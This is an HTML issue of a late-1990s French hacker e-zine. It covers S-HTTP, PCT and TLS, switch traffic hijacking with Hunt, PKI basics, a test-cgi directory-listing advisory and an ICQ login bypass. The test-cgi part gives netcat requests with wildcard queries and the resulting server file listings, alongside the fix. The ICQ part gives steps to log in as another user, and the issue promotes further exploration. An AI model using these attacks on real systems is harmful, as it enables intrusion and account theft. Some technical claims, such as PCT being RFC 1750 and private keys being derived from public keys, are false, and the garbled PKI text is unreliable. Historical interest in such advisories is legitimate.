Le client qui clique sur ce lien hypertexte compare ses options de chiffrement avec celles spécifiées dans le lien. S'il n'y a pas de concordance, la requête vers ce lien n'est pas transmise au serveur. Dans le cas contraire la requête est transmise au serveur. Le client ajoute ses options de chiffrement dans cette requête.
Le serveur reçoit la requête et vérifie les options de chiffrements du client et envoie le document au client.
<p align="justify">
<A NAME="general"><h4><b>5.4.3. Considérations générales</h4></b><p align="justify"></A>
Le serveur doit posséder une paire de clés asymétriques et un certificat délivrés par une autorité de certification. Pour distribuer sa clé publique au client, le serveur utilise le certificat. Le certificat est composé de la clé publique du serveur, du nom du serveur, du numéro de série du certificat et de la date d'expiration du certificat. Ces informations sont chiffrées avec la clé privée de l'autorité de certification de manière à pouvoir être déchiffrées par le client avec la clé publique de l'autorité de certification.
Le client doit également posséder une paire de clés asymétriques et un certificat. Il est possible d'envoyer aux clients le certificat du serveur en l'incluant dans une page HTML.
<p align="justify">
<A NAME="messages"><h4><b>5.4.4. Le chiffrement des messages</h4></b><p align="justify"></A>
S-HTTP peut utiliser deux mécanismes pour l'échange de clés de chiffrement. Le premier utilise la clé publique du destinataire pour chiffrer une clé symétrique (DES, IDEA), le second permet l'utilisation de clés externes à S-HTTP via une ligne d'en-tête de S-HTTP. S-HTTP peut ainsi encapsuler des messages chiffrés avec PKCS-7, PEM ou encore Kerberos. Le choix de la ou des méthodes de chiffrement utilisées, se fait par une négociation entre le client et le serveur selon les algorithmes supportés. Si le client ne possède pas de clé publique, une transaction par affectation directe d'une clé symétrique peut tout de même s'établir, ce qui permet l'établissement d'une transaction même si le client ne possède pas de clé publique.
<p align="justify">
Il existe en effet une option négociation qui permet aux clients et aux serveurs de se mettre d'accord sur les modes transactionnels, à savoir :
<UL>
  <LI>les messages sont signés ou non (utilisation de RSA, DSA ou PGP-algorithme de chiffrement issu du domaine public),
  <LI>Les messages sont chiffrés ou non (DES, RC2, RC4, IDEA).
</UL>

Ce système fonctionne sur le principe suivant :

<UL>
  <LI>une en-tête est ajouté aux messages HTTP
  <LI>cet en-tête et le message sont chiffrés et/ou signés
  <LI>l'ensemble est ensuite encapsulé dans un message S-HTTP
</UL>

Le numéro de port utilisé par le protocole S-HTTP est 8080.
<p align="justify">
<A NAME="auth"><h4><b>5.4.5. L'authentification</h4></b><p align="justify"></A>
Pour assurer l'authentification de l'expéditeur, S-HTTP requiert un certificat délivré par une autorité de certification.

<A NAME="integrite"><h4><b>5.4.6. L'intégrité du message</h4></b><p align="justify"></A>
Pour assurer l'intégrité d'un document S-HTTP utilise un mécanisme de signature électronique. Une fonction de " Hash Code " est passée sur le document pour générer un code MAC (Message Authentification Code). Ce code est fonction du texte du document et de la date pour prévenir les attaques en " play-back ", attaques où un message copié par un pirate est rejoué tel quel. 
Toujours pour prévenir les attaques en play-back, un mécanisme appelé " Nonce " permet de s'assurer de l'identité de l'autre partie à n'importe quel moment de la transaction. L'une des parties envoie un " Nonce ", une valeur donnée, à l'autre partie qui la chiffre et la renvoie à l'expéditeur. Si la réponse n'est pas chiffrée avec la clé sécrète, l'expéditeur refuse la connexion.

<A NAME="clair"><h4><b>5.4.7. Le mécanisme de récupération du message en clair </h4></b><p align="justify"></A>
Le destinataire du message S-HTTP doit lire les en-têtes du message S-HTTP pour reconnaître l'algorithme de chiffrement utilisé sur le message.

<A NAME="shttpssl"><h4><b>5.4.8. Comparaison de S-HTTP et de SSL</h4></b><p align="justify"></A>
Les buts poursuivis sont les mêmes, ont notera principalement que SSL fonctionne entre la couche TCP/IP et la couche application alors que S-HTTP assure la sécurité du protocole applicatif HTTP.

<A NAME="support"><h4><b>5.4.9. Algorithmes supportés</h4></b><p align="justify"></A>
Le chiffrement des messages peut être réalisé par :<p align="justify">
<UL>
  <LI>DES
  <LI>3DES
  <LI>IDEA
  <LI>RC2
  <LI>CDMF
</UL>


L'authentification peut être obtenu par :<p align="justify">
<UL>
  <LI>RSA
  <LI>DSS
</UL>

La gestion des clés est obtenue par :<p align="justify">
Kerberos
<UL>
    <LI>RSA
</UL>

Le hachage est obtenu par :<p align="justify">
<UL>
  <LI>MD2
  <LI>MD5
  <LI>MAC
</UL>

<A NAME="synthese"><h4><b>5.4.10. Synthèse</h4></b><p align="justify"></A>
Avantages
<UL>
  <LI>La sécurisation des messages HTTP
</UL>


Inconvénients
<UL>
  <LI>Le caractère spécifique aux services HTTP.
  <LI>Son positionnement par rapport à SSL qui fournie le même service et qui freinera son déploiement (voire l'empêchera).
</UL>
<p align="justify">
<p align="justify">
<p align="justify">
<p align="justify">
<BR><BR><BR>
<A NAME="pct"><h3><b>5.5. LE PROTOCOLE PCT (MICROSOFT)</h3></b><p align="justify"></A>
<A NAME="kro"><h4><b>5.5.1. Présentation</h4></b><p align="justify"></A>

Le standard PCT (Private Communication Technology) est né début novembre 1995 au sein d'un comité de réflexion regroupant des noms connus sur le marché des couches IP : Netmanage, Cylink, Spyglass, Openmarket, Novell, Compuserve et Microsoft. Il est étudié par l'IETF et correspond au RFC 1750.
<p align="justify">
PCT est la technologie proposée par Microsoft pour assurer la sécurité des communications privées. PCT est très proche de SSL. La version 1 de PCT corrige un certain nombre de faiblesses de SSL, notamment dans l'efficacité des techniques d'authentification. PCT sépare les techniques de chiffrement des techniques d'authentification, ce qui permet aux applications d'utiliser des clés de plus de 40 bits pour l'authentification. En conséquence, PCTRef (nom du logiciel qui implémente PCT) n'est disponible que sur le territoire américain et au Canada.
<p align="justify">
Ce protocole se situe entre la couche transport et la couche applicative. De ce fait, ceci le rend transparent pour les applications Internet.
Techniquement, il est complètement comparable à SSL (positionnement, objectifs, architecture, etc.).
La résistance attendue de PCT au piratage est annoncée comme allant au-delà de celle de SSL. PCT permet aux applications d'utiliser une méthode d'authentification avec un algorithme supérieur à 40 bits.
<p align="justify">
<A NAME="syntpct"><h4><b>5.5.2. Synthèse</h4></b><p align="justify"></A>
En pratique, il faut considérer que SSL et PCT ne sont que des sous-produits de la gigantesque guerre entre Netscape (leader SSL) et Microsoft (leader PCT).
il est clair que le marché actuel est SSL.
<p align="justify">
Complément d'informations sur PCTRef	<A HREF="http://pct.microsoft.com/pct/pctref1.html">http://pct.microsoft.com/pct/pctref1.html</A><br>
Spécifications de PCT	<A HREF="http://pct.microsoft.com/pct/pct.htm">http://pct.microsoft.com/pct/pct.htm</A>

<p align="justify">
L'inconvénient majeur est semble-t-il  l'abandon quasi officiel de Microsoft sur ce projet, actuellement seul Netmanage implémente PCT.
Dans l'état actuel, ce produit ne peut être retenu comme standard.

<p align="justify">
<p align="justify">
<A NAME="tls"><h3><b>5.6. TLS</h3></b><p align="justify"></A>
<A NAME="prestls"><h4><b>5.6.1. Présentation</h4></b><p align="justify"></A>
TLS, " Transport Layer Security " n'est pas encore implémenté aujourd'hui.
Il est complètement identique en positionnement, architecture et objectifs à SSL et PCT.
Son existence, étudiée par l'IETF et les groupes de travail sécurité associés, semble essentiellement destinée à créer une convergence " neutre " entre SSL et PCT.
Il pourrait à ce titre être la solution finale en matière de protocole de négociation et de mise en uvre des algorithmes de sécurité entre deux correspondants.
<p align="justify">
Il est toutefois important de noter que les spécifications de TLS sont strictement identiques (à quelques exceptions près) aux spécifications de SSL V3 (à tel point que le draft remis à l'IETF (en décembre 1996) a été réalisé par Netscape et qu'il reprend pratiquement mot pour mot le document SSL).
<p align="justify">
<A NAME="base"><h4><b>5.6.2. Principe de base</h4></b><p align="justify"></A>
Les principes techniques de TLS sont strictement identiques aux principes techniques de SSL V3.
Les objectifs sont les mêmes ; il existe deux niveaux de protocole (TLS Record Protocol et TLS Handshake Protocol) ; les numéros de port pour HTTP, SMTP et NNTP sont identiques.
3 nouveaux numéros de port ont cependant été rajoutés :<br>
<B>636</B> pour l'utilisation de TLS avec <B>LDAP</B> (light directory access protocol ; ssl-ldap)
Avertissement : " ssl-ldap " n'est pas une erreur de notre part, cette notation est celle du draft remis à l'IETF.<br>
<B>990</B> pour l'utilisation de TLS avec <B>TFP</B> (ftps)<br>
<B>995</B> pour l'utilisation de TLS avec <B>POP</B> (spop3)<br>
La gestion des clés avec KERBEROS est possible avec TLS (ce qui n'est pas le cas avec SSL).
<p align="justify">
<A NAME="synttls"><h4><b>5.6.3. Synthèse</h4></b><p align="justify"></A>
Avantages
<UL TYPE=DISC>
  <LI>La convergence entre SSL et PCT
  <LI>La sécurisation des principaux protocoles utilisés sur Internet
  <LI>Le support de Kerberos
</UL>
Inconvénients
<UL>
  <LI>Le manque d'implémentation
<p align="justify">
<p align="justify">
<h4><b>Sources :</h4></b><p align="justify">
[<A HREF="http://www.rsa.com/rsalabs/faq/q8.html ">www.rsa.com</A>|
<A HREF="http://www.hrnet.fr/~matthieu/crypto/432.htm">http://www.hrnet.fr/~matthieu/crypto/432.htm</A>|
<a href="mailto:sniffdoz@yahoo.com">Sniffdoz (pour plus d'infos)</a>]
</UL>

</td></tr></table>
<pre>
¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸</pre>
<BR><BR><BR><BR><BR><BR><BR><pre>
<a name="*3*">           _        _______________________________________        _
-*3*-       `^°*;:,.> <FONT COLOR="#FF0000">C</FONT><FONT COLOR="#F80007">o</FONT><FONT COLOR="#F1000E">m</FONT><FONT COLOR="#EA0015">m</FONT><FONT COLOR="#E3001C">e</FONT><FONT COLOR="#DC0023">n</FONT><FONT COLOR="#D5002A">t</FONT><FONT COLOR="#CE0031"> </FONT><FONT COLOR="#C70038">h</FONT><FONT COLOR="#C0003F">a</FONT><FONT COLOR="#B90046">c</FONT><FONT COLOR="#B2004D">k</FONT><FONT COLOR="#AB0054">e</FONT><FONT COLOR="#A4005B">r</FONT><FONT COLOR="#9D0062"> </FONT><FONT COLOR="#960069">u</FONT><FONT COLOR="#8F0070">n</FONT><FONT COLOR="#880077"> </FONT><FONT COLOR="#81007E">s</FONT><FONT COLOR="#7A0085">w</FONT><FONT COLOR="#73008C">i</FONT><FONT COLOR="#6C0093">t</FONT><FONT COLOR="#65009A">c</FONT><FONT COLOR="#5E00A1">h</FONT><FONT COLOR="#5700A8"> </FONT><FONT COLOR="#5000AF">-</FONT><FONT COLOR="#4900B6">s</FONT><FONT COLOR="#4200BD">n</FONT><FONT COLOR="#3B00C4">i</FONT><FONT COLOR="#3400CB">f</FONT><FONT COLOR="#2D00D2">f</FONT><FONT COLOR="#2600D9">d</FONT><FONT COLOR="#1F00E0">o</FONT><FONT COLOR="#1800E7">z</FONT><FONT COLOR="#1100EE">-</FONT> <.,:;*°^`
___________________/¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\_____________________
</pre>
<table border=0 width=640><tr><td>
Dans l'article sur les sniffeurs, j'expliquais qu'une des parade contre le sniff était de virer les hubs et d'utiliser un switch dans les interconnexions réseaux. <p align="justify">
<b>Retour au source</b><br>
De base un hub émet les paquets reçus par un expediteur quelconque
à l'ensemble des utilisateurs connectés à ce hub (principe du broadcast). Avec un switch, chaque paquet émis n'est attribué qu'au destinataire désiré. Dans ce cas, la selection dans la distribution des paquets se fait au niveau de l'adresse MAC (niveau 2 de l'OSI). Un switch assure un canal de communication exclusif et non paratagé entre deux machines qui s'échangent des données.
<p align="justify">
   Dans le principe sur un switch chaque connexion (prise) est liée à une adresse MAC, l'allocation prise/adresse MAC se fait soit de facon dynamique, ce système est géré par le switch, soit en statique, ou l'administrateur écrit en dur dans le switch les correspondances.
 </p>  
<p align="justify">   
<B> L'attaque du train postal   </B>
<br>
Il existe une faille dans la gestion dynamique de l'allocation prise/MAC. Un programme va nous permettre de la mettre en évidence
en detournant un canal de communication, ceci nous permettra de recevoir des paquets qui ne nous étaient pas destinés.  
Ceux qui ont eu l'idée d'installer Linux sur leur machine, vont pouvoir la découvrir en utilisant le programme HUNT de Pavel Krautz.
<p align="justify">
Comment ça marche ?<br>
Tout d'abord, Hunt va demander au switch de ne plus associer telle prise avec telle adresse MAC, et inserer la notre sur la prise voulue.
Il va ensuite forcer le switch à router les paquets à destination de notre adresse MAC. 
Nous allons tous simplement dérouter les paquets... Prenant la place de la victime.
</p>
Mais ce n'est pas tout<br>
Hunt permet à l'intrus de se transformer en relais, une fois le paquets dérouté vers l'intrus il le reroute vers le
destinataire original, si c'est pas beau la technologie. Le switch devient un simple hub au travers de HUNT.
<p align="justify">
Evidemment un telle attaque demande de connaitre les adresses MAC des personnes connectées au switch (si vous connaissez l'IP
 une petit commande ARP va nous permettre de découvrir son adresse MAC)
</p>

<b>La Parade</b><br>
D'après les tests effectués, cela concerne les switch mal administrés, pour les switch ayant une table statique (écrite en dur par l'administrateur)
cela n'a pas l'air de fonctionner, la plupart des administrateurs laissent leur switch gérer dynamiquement l'allocation prise/MAC, cela nous laisse de la marge.<br>
L'apparition du VLAN modifie un peu cette vision, puisque l'administrateur agit en direct sur le switch pour créer des groupes d'adresses MAC ou IP...<br>
Pour l'instant ce produit n'est pas encore très diffusé...

<p align="justify">
La seule sécurité possible reste le cryptage de l'information (PKI, RSA, blabla...)</br>
</p>
<b>Hunt en profondeur</b>
<br>
D'après son auteur : c'est un programme permettant de s'introduire dans une connexion, de la surveiller et d'en prendre le controle. La dernière version est la 1.3
(pour Linux seulement), permettant de surveiller les connexion en cours sur le meme sous-réseau.
<p align="justify">
<p align="justify">
<a href="http://www.cri.cz/kra/index.html">Vous pourrez télécharger Hunt1.3, sur le site de Pavel Krautz</a>
<p align="justify">
<p align="justify">
<b>Lexique :</b>
<p align="justify">
Hub : boitier qui concentre un ensemble d'ordinateur, il effectue la concentration et la retransmission des messages qu'il recoit d'un emetteur vers l'ensemble des destinataires
connectés au hub.
<p align="justify">
Switch : boitier qui concentre un ensemble d'ordinateur, effectue la concentration et la retransmission des messages qu'il recoit d'un emetteur vers un destinataire précis. (selection par l'adresse MAC)
<p align="justify">
<p align="justify"> 
<a href="mailto:sniffdoz@yahoo.com">Sniffdoz</a>
</td></tr></table>
<pre>
¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸</pre>
<BR><BR><BR><BR><BR><BR><BR><pre>
<a name="*4*">           _        _______________________________________        _
-*4*-       `^°*;:,.>   <FONT COLOR="#FF0000">P</FONT><FONT COLOR="#F70008">K</FONT><FONT COLOR="#EF0010">I</FONT><FONT COLOR="#E70018"> </FONT><FONT COLOR="#DF0020"> </FONT><FONT COLOR="#D70028">-</FONT><FONT COLOR="#CF0030">c</FONT><FONT COLOR="#C70038">r</FONT><FONT COLOR="#BF0040">y</FONT><FONT COLOR="#B70048">p</FONT><FONT COLOR="#AF0050">t</FONT><FONT COLOR="#A70058">o</FONT><FONT COLOR="#9F0060">l</FONT><FONT COLOR="#970068">o</FONT><FONT COLOR="#8F0070">g</FONT><FONT COLOR="#870078">i</FONT><FONT COLOR="#7F0080">e</FONT><FONT COLOR="#770088">-</FONT><FONT COLOR="#6F0090"> </FONT><FONT COLOR="#670098"> </FONT><FONT COLOR="#5F00A0">B</FONT><FONT COLOR="#5700A8">y</FONT><FONT COLOR="#4F00B0"> </FONT><FONT COLOR="#4700B8">S</FONT><FONT COLOR="#3F00C0">n</FONT><FONT COLOR="#3700C8">i</FONT><FONT COLOR="#2F00D0">f</FONT><FONT COLOR="#2700D8">f</FONT><FONT COLOR="#1F00E0">d</FONT><FONT COLOR="#1700E8">o</FONT><FONT COLOR="#0F00F0">z</FONT>   <.,:;*°^`
___________________/¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\_____________________
</pre>
<table border=0 width=640><tr><td>
<p align="justify">L'évolution d'une nouvelle culture globale d'échanges et de gestion de réseau d'information électronique a signifié que des compagnies sont confrontées à une plus grande probabilité d'être une victime de fraude, sniff d'email, vol de données aussi bien que la corruption involontaire des fichiers par les employés non autorisés. l'infrastructure de clé publique (PKI) est la combinaison de logiciels, de technologies de chiffrement, et de services qui permettent à des entreprises de protéger leurs transmissions et transactions sur l'Internet. 
</p>
<p><b>Principe :</b>
</p>
<p align="justify">
Une clé publique est une valeur fournie a une autorité indiquée comme clé dite sure (RSA, DES..), combinée avec une clé privée dérivée de la clé publique, et qui peut être employée pertinemment pour chiffrer et déchiffrer des messages et des signatures digitales.
<p align="justify">
Dans la cryptographie, une clé est une valeur variable qui est appliquée en utilisant un algorithme a une chaîne de caractères ou à un bloc de texte non codé pour produire le texte chiffré. La longueur de la clé détermine généralement la difficulté à déchiffrer le texte dans un message donné. 
<p align="justify">
Le chiffrement est la conversion des données dans une forme, appelée un chiffre (cipher), qui ne peut pas être facilement compris par les personnes non autorisées. Le déchiffrage est le processus de convertir des données chiffrées de nouveau dans sa forme initiale, ainsi il peut être compris. 
<p align="justify">
Une signature digitale (a ne pas confondre avec un certificat digital) est une signature électronique écrite, qui peut être employée par quelqu'un pour authentifier l'identité de l'expéditeur d'un message ou du signataire d'un document. Il peut également être employe pour s'assurer que le contenu initial du message ou du document qui ont été donnés est inchangé. Les avantages supplémentaires à l'utilisation d'une signature digitale sont qu'elle sont facilement transportables, ne peuvent pas être facilement niées, ne peuvent pas être imitées par quelqu'un d'autre, et peuvent être automatiquement horodatées. 
<p align="justify">
L'utilisation des clés publiques et privées combinées est connue en tant que cryptographie asymétrique. Le système pour l'usage des clés publiques s'appelle une infrastructure à clé publique (PKI). 
<p align="justify">
<b>Fonctionnement:</b>
<p align="justify">
Chaque utilisateur d'un cryptosysteme de clé publique possède une paire relative de clés.
<p align="justify">
Un texte par exemple encodé avec une clé peut seulement être décodé par lui. Chaque utilisateur garde une clé secrete principale et édite l'autre.
<p align="justify">
Ainsi d'autres peuvent utiliser la clé publique de l'utilisateur pour envoyer les messages que  seul l'utilisateur peut lire, ou l'utilisateur " signe " son message avec sa clé privée d'authentification - les autres peuvent appliquer la clé publique de l'utilisateur pour vérifier que le message est venu de l'utilisateur.
<p align="justify">
L'infrastructure de clé Publique (PKI) est la combinaison du logiciel, des technologies de chiffrement, et des services qui permettent à des entreprises de protéger la sécurité de leurs transmissions et transactions sur l'Internet.  
<p align="justify">
Les PKIs intègrent les certificats digitaux (CA), la cryptographie à clé publique, et les  certificat d'autorités , dans l'ensemble de l'architecture de l'entreprise et sécurise le réseau. Le PKI d'une entreprise typique adresse à l'ensemble de l'établissement des certificats digitaux à différents utilisateurs et serveurs; avec logiciel d'inscription d'utilisateur; intégration avec les répertoires de corporation de certificat; outils pour contrôler, remplacer, et retirer des certificats; et services et support relatifs.  
<p align="justify">
<a href="mailto:sniffdoz@yahoo.com">Sniffdoz</a>
</td></tr></table>



<pre>
¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸</pre>
<BR><BR><BR><BR><BR><BR><BR><pre>
<a name="*5*">           _        _______________________________________        _
-*5*-       `^°*;:,.>   <FONT COLOR="#FF0000">B</FONT><FONT COLOR="#F70008">u</FONT><FONT COLOR="#EF0010">g</FONT><FONT COLOR="#E70018"> </FONT><FONT COLOR="#DF0020">C</FONT><FONT COLOR="#D70028">G</FONT><FONT COLOR="#CF0030">I</FONT><FONT COLOR="#C70038">-</FONT><FONT COLOR="#BF0040">T</FONT><FONT COLOR="#B70048">E</FONT><FONT COLOR="#AF0050">S</FONT><FONT COLOR="#A70058">T</FONT><FONT COLOR="#9F0060">(</FONT><FONT COLOR="#970068">t</FONT><FONT COLOR="#8F0070">r</FONT><FONT COLOR="#870078">a</FONT><FONT COLOR="#7F0080">d</FONT><FONT COLOR="#770088">u</FONT><FONT COLOR="#6F0090">c</FONT><FONT COLOR="#670098">t</FONT><FONT COLOR="#5F00A0">i</FONT><FONT COLOR="#5700A8">o</FONT><FONT COLOR="#4F00B0">n</FONT><FONT COLOR="#4700B8"> </FONT><FONT COLOR="#3F00C0">Y</FONT><FONT COLOR="#3700C8">o</FONT><FONT COLOR="#2F00D0">p</FONT><FONT COLOR="#2700D8">y</FONT><FONT COLOR="#1F00E0">o</FONT><FONT COLOR="#1700E8">p</FONT><FONT COLOR="#0F00F0">)</FONT>   <.,:;*°^`
___________________/¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\_____________________


</b>
<pre>
Traduction, modifications,
expansion, detonation,
reaction en chaine:
<a href="mailto:yopyop@webmails.com">yopyop</a>

Correction, aide subliminale,
et savate par:
<a href="mailto:tobozo@biosys.net">tobozo</a>

Auteurs:Plein plein plein...
Le pemier Advisory a ete fait par L0pht
cgi-testmail: mudge@l0pht.com



<B>                     Vulnerabilites de "test-cgi"
                    dans certaines configurations
</b>

<B>Programmes Affectes:</b> les scripts test-cgi qui peuvent etre trouves sur differents
serveurs web. 

<B>Severite:</b> Tout le monde peut faire un inventaire des fichiers presents sur le
serveur.

<B>Contenu:</b> Sur de nombreux sites web se trouve un fichier appelle test-cgi 
(en general dans le repertoire cgi-bin ou similaire). Il existe un probleme sur
la plupart de ces fichiers test-cgi. 

Administrateurs et Webmasters, si votre fichier test-cgi contient la ligne 
suivante, alors vous etes probablement vulnerable (aie).

<B>echo QUERY_STRING = $QUERY_STRING</b>

Toutes les lignes de ce type devraient avoir les variables fermees par des 
guillemets (<B>"</b>). Sans ces guillemets, certains caracteres (en particulier '<B>*</b>') 
peuvent etre utilises, alors qu'il ne devraient pas. Par consequent, en soumettant
une requete '<B>*</b>' retournera tous les fichiers du repertoire courant...
On pourra donc voir tous les autres fichiers cgi utilises par le site :).
Une requete '<B>/*</b>' retournera tous les fichiers et repertoires presents a la racine.
Et ainsi de suite...

La maniere la plus simple de lister les repertoires et fichiers est par la 
variable QUERY. Toutefois, il est possible de faire la meme chose avec d'autres 
variables (<B>$REMOTE_HOST, $REMOTE_USER</b>, etc.).

<B>Reparation:</b> La plus simple solution pour corriger ce probleme est de placer des 
guillemets autour de chaque variable (guillemets qui auraient du s'y trouver 
depuis le debut...) :

<B>echo QUERY_STRING = <font color="#ff0000">"</font>$QUERY_STRING<font color="#ff0000">"</font></b>

Le fichier incorrect a ete vu dans de nombreuses versions de NCSA, et Apache.

<B>Exemple d'exploit:</b>

nc egal a netcat (un utilitaire du type telnet, mais avec beaucoup plus de 
possiblites...), si vous ne le possedez pas il faut vous le procurer absolument! 
Vous pouvez toutefois faire un telnet sur le port 80 et faire un GET.
<font face="arial" size="-1"><B>
------------------
machine% echo "GET /cgi-bin/test-cgi?/*" | nc gros.naze.com 80

CGI/1.0 test script report:

argc is 1. argv is /\*.
SERVER_SOFTWARE = NCSA/1.4.1
SERVER_NAME = du.con.com
GATEWAY_INTERFACE = CGI/1.1
SERVER_PROTOCOL = HTTP/0.9
SERVER_PORT = 80
REQUEST_METHOD = GET
HTTP_ACCEPT =
PATH_INFO =
PATH_TRANSLATED =
SCRIPT_NAME = /bin/cgi-bin/test-cgi
QUERY_STRING = /a /bin /boot /bsd /cdrom /dev /etc /home /lib /mnt /root /sbin 
/stand /sys /tmp /usr /usr2 /var
REMOTE_HOST = remote.machine.com
REMOTE_ADDR = 255.255.255.255
REMOTE_USER =
AUTH_TYPE =
CONTENT_TYPE =
CONTENT_LENGTH =

------------------
</font></b>
Ou encore pour voir les autres cgi present sur le serveur:
<font face="arial" size="-1"><B>
------------------
machine% echo "GET /cgi-bin/test-cgi?*" | nc gros.naze.com 80

CGI/1.0 test script report:

argc is 1. argv is \*.

SERVER_SOFTWARE = NCSA/1.4.1
SERVER_NAME = gros.naze.com
GATEWAY_INTERFACE = CGI/1.1
SERVER_PROTOCOL = HTTP/0.9
SERVER_PORT = 80
REQUEST_METHOD = GET
HTTP_ACCEPT =
PATH_INFO =
PATH_TRANSLATED =
SCRIPT_NAME = /bin/cgi-bin/test-cgi
QUERY_STRING = calendar cgi-archie cgi-calendar cgi-date cgi-finger cgi-fortune 
cgi-lib.pl imagemap imagemap.cgi imagemap.conf index.html mail-query mail-query-2 
majordomo majordomo.cf marker.cgi menu message.cgi munger.cgi munger.note 
ncsa-default.tar post-query query smartlist.cf src subscribe.cf test-cgi uptime
REMOTE_HOST = remote.machine.com
REMOTE_ADDR = 255.255.255.255
REMOTE_USER =
AUTH_TYPE =
CONTENT_TYPE =
CONTENT_LENGTH =
</font></b>
Et voila, vous vous retrouvez avec la liste de tous les scripts integres au 
serveurs, certains etant livres avec le package CGI, d'autres appartenant a 
des utilisateurs ou meme au webmaster, et il ne vous reste plus qu'a passer 
en phase d'exploration.

</pre><B>
¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸</pre>
<BR><BR><BR><BR><BR><BR><BR><pre>
<a name="*6*">           _        _______________________________________        _
-*6*-       `^°*;:,.>  <FONT COLOR="#FF0000">I</FONT><FONT COLOR="#F70008">C</FONT><FONT COLOR="#EF0010">Q</FONT><FONT COLOR="#E70018"> </FONT><FONT COLOR="#DF0020">P</FONT><FONT COLOR="#D70028">a</FONT><FONT COLOR="#CF0030">s</FONT><FONT COLOR="#C70038">s</FONT><FONT COLOR="#BF0040">w</FONT><FONT COLOR="#B70048">o</FONT><FONT COLOR="#AF0050">r</FONT><FONT COLOR="#A70058">d</FONT><FONT COLOR="#9F0060"> </FONT><FONT COLOR="#970068">c</FONT><FONT COLOR="#8F0070">o</FONT><FONT COLOR="#870078">m</FONT><FONT COLOR="#7F0080">m</FONT><FONT COLOR="#770088">e</FONT><FONT COLOR="#6F0090">n</FONT><FONT COLOR="#670098">t</FONT><FONT COLOR="#5F00A0"> </FONT><FONT COLOR="#5700A8">v</FONT><FONT COLOR="#4F00B0">o</FONT><FONT COLOR="#4700B8">l</FONT><FONT COLOR="#3F00C0">e</FONT><FONT COLOR="#3700C8">r</FONT><FONT COLOR="#2F00D0"> </FONT><FONT COLOR="#2700D8">u</FONT><FONT COLOR="#1F00E0"></FONT><FONT COLOR="#1700E8">n</FONT><FONT COLOR="#0F00F0"> </FONT><FONT COLOR="#0700F8">UIN</FONT>  <.,:;*°^`
___________________/¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\_____________________
</b>

<B>Sujet:</b> Gros trou de securite d'icq.

Il est possible de se connecter sur les serveurs ICQ sous le compte de 
n'importe qui <B>sans avoir a connaitre son mot passe</b> ce qui aboutit a toutes 
sortes de compromis. Et il ne s'agit *pas* simplement de spoofing.

<B>Comment ca marche :</b>
Le serveur aol (pardon, mirabilis) utilise un password de 8 caracteres. Les 
clients effectuent la verification du compte et envoient seulement des passwords 
de 8 caracteres ou moins. Le clones de linux -le mien en particulier- ne font 
pas ca.

Quand un password de 9 caracteres ou plus est envoye, leur buffer se prend un 
over-run dans la tronche et autorise le logon (vous me suivez?)

<B>L'exploit :</b>
En telechargeant n'importe quel clone de ICQ (exemple: http://hookah.ml.org/zicq)
Entrez l'uin de la cible
Enrez un password comme "123456789" <-- Juste assez large pour faire l'overflow
Demarrez le programme ICQ. 

Si tout va bien, il se loggue et se connecte en tant que cet utilisateur. 
Tous les messages en attente vous arriveront. Vous pouvez maintenant envoyer et 
recevoir comme si vous etiez la cible.

<B>Notes:</b> Il ne s'agit PAS de spoofing, vous etes loggues exactement en tant que 
cet UIN. Cela fonctionne sur tous les UIN, du moment que l'uin en question n'est 
pas deja loggue.

Mirabilis / AOL ont vraiment besoin de fixer ce probleme...

<B>NDT :</b> a l'heure qu'il est Mirabilis a desactive la possibilite de changer le
mot de passe en utilisant cette methode. Le seul effet de cet exploit est donc
de pouvoir temporairement voler un UIN. Une question subsiste neanmoins : 
peut on changer les infos personnelles ? Si vous avez la reponse, ecrivez nous.

Traduction Yopyop & Tobozo(c'etait vraiment dur!)



<B>
¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸¸,ø¤º°`°º¤ø,¸
</b>

The end

Pas de jargon file dans cette edition.
The Hackoff #16 est deja sur le feu a l'heure ou j'ecris ces lignes. Je n'ai pas
le temps d'ecrire d'articles en ce moment car je recois les textes une telle 
vitesse qu'il est difficile de suivre (surtout avec un site web a manager..). 

Les sujets du prochain hackoff sont : 

-Back orifice nouvelles versions (europeene et americaine)
-Comment creer ses propres paquets ICQ
-Differents types d'intrusions
-Suite de l'IRC-hack tutorial.
-Jargon file
<B>
________________________________________________________________________________
¬­®¯°±²³´µ·¸¹º»¿øØÞþæ¡¢£¤¥ ¦§¨©ª«¬­®¯°±²³´µ·¸¹º»¿øØÞþæ¡¢£¤¥ ¦§¨©ª«¬¡¢£¤¥ ¦§¨©ª«¬­
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
                         -{\________________________/}-
   ~~    ~~    ~~    ~~°ºØø¦    ¿ H A C K 0 F F ?   ¦øØº°~~    ~~    ~~    ~~    
